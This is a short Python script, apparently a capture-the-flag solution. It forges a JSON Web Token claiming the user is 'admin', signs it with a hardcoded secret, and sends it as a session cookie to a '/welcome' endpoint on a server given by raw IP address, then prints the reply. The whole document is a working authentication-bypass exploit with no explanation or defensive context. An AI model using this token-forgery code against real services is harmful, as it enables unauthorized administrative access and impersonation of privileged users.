import requests
import jwt

jwtData = { 
        "user": "admin" 
    }

cookie = jwt.encode(jwtData, "mstzt", algorithm="HS256")
print(cookie)

url = 'http://103.185.44.122:5000/welcome'
cookies = {'appdata': cookie}

response = requests.get(url, cookies=cookies)

print(response.text)